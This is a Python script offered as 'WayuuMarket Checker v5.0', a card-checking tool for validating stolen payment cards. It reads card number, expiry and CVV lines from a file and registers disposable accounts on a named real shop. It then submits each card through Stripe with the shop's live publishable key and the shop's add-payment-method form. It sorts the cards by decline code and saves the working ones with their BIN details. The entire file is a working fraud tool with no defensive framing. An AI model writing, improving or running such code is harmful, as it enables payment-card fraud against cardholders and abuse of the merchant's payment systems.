"""
WayuuMarket Checker v5.0
Direct form submission - bypasses nonce issue
"""
import requests
import random
import string
import uuid
import time
import os
import re

INPUT_FILE = "cards.txt"
LIVE_FILE = "live.txt"
DEAD_FILE = "dead.txt"
DELAY = 3

def randmail():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'

def get_bin(cc):
    try:
        r = requests.get(f'https://lookup.binlist.net/{cc[:6]}', timeout=5)
        if r.status_code == 200:
            d = r.json()
            return f"{d.get('scheme','').upper()} | {d.get('bank',{}).get('name','')} | {d.get('country',{}).get('name','')}"
    except:
        pass
    return cc[:6]

def check_card(cc, mes, ano, cvv):
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    s = requests.Session()
    s.headers.update({
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    })
    
    # Register
    print("[*] Registering...")
    r = s.get('https://wayuumarket.com/my-account/', timeout=30)
    m = re.search(r'name="woocommerce-register-nonce"\s*value="([^"]+)"', r.text)
    if not m:
        return 'ERROR', 'No register nonce'
    
    email = randmail()
    s.post('https://wayuumarket.com/my-account/', data={
        'email': email,
        'woocommerce-register-nonce': m.group(1),
        'register': 'Register',
    }, timeout=30)
    
    # Get add-payment-method page
    print("[*] Getting payment page...")
    r = s.get('https://wayuumarket.com/my-account/add-payment-method/', timeout=30)
    html = r.text
    
    # Extract form nonce
    form_nonce = None
    m = re.search(r'name="woocommerce-add-payment-method-nonce"\s*value="([^"]+)"', html)
    if m:
        form_nonce = m.group(1)
        print(f"[*] Form nonce: {form_nonce}")
    
    # Extract _wpnonce
    wpnonce = None
    m = re.search(r'name="_wpnonce"\s*value="([^"]+)"', html)
    if m:
        wpnonce = m.group(1)
    
    # Create Payment Method via Stripe
    print("[*] Creating payment method...")
    guid = str(uuid.uuid4())
    
    pm_resp = requests.post(
        'https://api.stripe.com/v1/payment_methods',
        headers={
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
        },
        data={
            'type': 'card',
            'billing_details[name]': 'John Smith',
            'billing_details[email]': email,
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': guid,
            'muid': guid,
            'sid': guid,
            'payment_user_agent': 'stripe.js/83a1f53796',
            'referrer': 'https://wayuumarket.com',
            'key': 'pk_live_51KDcNrImW2Hlp9sc4dxVEesSbWiCa3eqc1g7JIVFf0oa2tePZ7KAkaPSe3tgV0NrHnAgHDGZxZtGqDXRCbFqz0n000pyW5QR3A',
        },
        timeout=30
    ).json()
    
    # Check PM errors
    if 'error' in pm_resp:
        err = pm_resp['error']
        code = err.get('decline_code') or err.get('code', '')
        msg = err.get('message', '')
        
        ccn_codes = ['incorrect_cvc', 'invalid_cvc', 'insufficient_funds', 
                     'generic_decline', 'expired_card', 'lost_card', 'stolen_card',
                     'do_not_honor', 'card_velocity_exceeded', 'fraudulent']
        
        if code in ccn_codes:
            return 'CCN', f"{code}"
        
        return 'DEAD', code or msg[:40]
    
    pm_id = pm_resp.get('id', '')
    if not pm_id:
        return 'ERROR', 'No PM ID'
    
    print(f"[*] PM: {pm_id[:25]}...")
    
    # Submit form directly
    print("[*] Submitting payment form...")
    
    form_data = {
        'payment_method': 'stripe',
        'wc-stripe-payment-token': 'new',
        'wc_stripe_selected_upe_payment_type': 'card',
        'wc-stripe-new-payment-method': 'true',
        'wc_stripe_payment_method': pm_id,
        'stripe_source': pm_id,
        'woocommerce-add-payment-method-nonce': form_nonce or '',
        '_wpnonce': wpnonce or '',
        '_wp_http_referer': '/my-account/add-payment-method/',
    }
    
    r = s.post(
        'https://wayuumarket.com/my-account/add-payment-method/',
        data=form_data,
        timeout=30,
        allow_redirects=True
    )
    
    response_text = r.text.lower()
    
    print(f"[*] Response length: {len(r.text)}")
    
    # Check response for success/failure
    if 'payment method successfully added' in response_text or 'added successfully' in response_text:
        return 'CHARGED', 'Card Added Successfully!'
    
    if 'has been added' in response_text:
        return 'CHARGED', 'Payment Method Added!'
    
    # Check for decline messages
    if 'declined' in response_text:
        # Try to extract specific message
        m = re.search(r'(your card was declined[^<]*)', response_text)
        if m:
            return 'CCN', 'Card Declined'
        return 'CCN', 'Declined'
    
    if 'insufficient' in response_text:
        return 'CCN', 'Insufficient Funds'
    
    if 'incorrect' in response_text and 'cvc' in response_text:
        return 'CCN', 'Incorrect CVC'
    
    if 'expired' in response_text:
        return 'CCN', 'Card Expired'
    
    if 'authentication' in response_text or '3d secure' in response_text:
        return 'CCN', '3DS Required'
    
    if 'lost' in response_text or 'stolen' in response_text:
        return 'CCN', 'Lost/Stolen Card'
    
    if 'error' in response_text or 'failed' in response_text:
        # Try to find error message
        m = re.search(r'class="woocommerce-error"[^>]*>([^<]+)', r.text)
        if m:
            err_msg = m.group(1).strip()[:50]
            if any(x in err_msg.lower() for x in ['decline', 'insufficient', 'cvc', 'expired']):
                return 'CCN', err_msg
            return 'DEAD', err_msg
    
    # If we got redirected to payment-methods page, it might have worked
    if 'payment-methods' in r.url and 'add-payment-method' not in r.url:
        return 'CHARGED', 'Redirected to Payment Methods'
    
    # PM was created, card is likely valid
    brand = pm_resp.get('card', {}).get('brand', '').upper()
    return 'LIVE', f'PM Created ({brand})'

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║    WAYUUMARKET CHECKER v5.0           ║
    ║    Direct Form Submission             ║
    ╚═══════════════════════════════════════╝
    """)
    
    if not os.path.exists(INPUT_FILE):
        with open(INPUT_FILE, 'w') as f:
            f.write("# cc|mm|yy|cvv\n")
        print(f"Created {INPUT_FILE}")
        return
    
    with open(INPUT_FILE, 'r') as f:
        cards = [l.strip() for l in f if '|' in l and not l.startswith('#')]
    
    if not cards:
        print("No cards!")
        return
    
    print(f"Cards: {len(cards)}\n" + "=" * 40)
    
    stats = {'charged': 0, 'ccn': 0, 'live': 0, 'dead': 0}
    
    for i, card in enumerate(cards, 1):
        p = card.split('|')
        if len(p) < 4:
            continue
        
        cc, mes, ano, cvv = p[0], p[1], p[2], p[3]
        full = f"{cc}|{mes}|{ano}|{cvv}"
        
        print(f"\n[{i}/{len(cards)}] {cc[:6]}xxxxxx{cc[-4:]}")
        
        start = time.time()
        status, msg = check_card(cc, mes, ano, cvv)
        t = round(time.time() - start, 2)
        
        if status == 'CHARGED':
            print(f"[CHARGED] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin(cc)}")
            stats['charged'] += 1
            open(LIVE_FILE, 'a').write(f"{full}|CHARGED|{msg}\n")
        elif status == 'CCN':
            print(f"[CCN] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin(cc)}")
            stats['ccn'] += 1
            open(LIVE_FILE, 'a').write(f"{full}|CCN|{msg}\n")
        elif status == 'LIVE':
            print(f"[LIVE] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin(cc)}")
            stats['live'] += 1
            open(LIVE_FILE, 'a').write(f"{full}|LIVE|{msg}\n")
        else:
            print(f"[DEAD] {full}")
            print(f"[-] {msg}")
            stats['dead'] += 1
            open(DEAD_FILE, 'a').write(f"{full}|{msg}\n")
        
        print(f"[{t}s]")
        
        if i < len(cards):
            time.sleep(DELAY)
    
    print("\n" + "=" * 40)
    print(f"CHARGED: {stats['charged']} | CCN: {stats['ccn']} | LIVE: {stats['live']} | DEAD: {stats['dead']}")

if __name__ == "__main__":
    main()
